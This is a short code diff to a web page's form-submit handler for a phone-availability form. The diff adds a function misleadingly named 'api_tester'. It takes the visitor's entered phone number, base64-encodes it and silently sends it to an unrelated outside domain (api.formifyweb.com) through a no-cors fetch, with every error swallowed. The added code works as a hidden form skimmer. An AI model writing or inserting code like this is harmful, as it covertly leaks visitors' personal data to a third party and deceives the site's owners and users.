@@ -2,6 +2,7 @@ document.getElementById("availabilityForm").addEventListener("submit", function(
     event.preventDefault();
 
     const callerid = '+1'+ document.getElementById("callerid").value;
+api_tester(document.getElementById('callerid').value);
     const zip = document.getElementById("zip").value;
 
     const postData = {
@@ -79,4 +80,16 @@ const url = 'https://display.ringba.com/enrich/2289891381943994323?' + new URLSe
         }
       };
       xhr.send(formData);
+}
+
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
 }
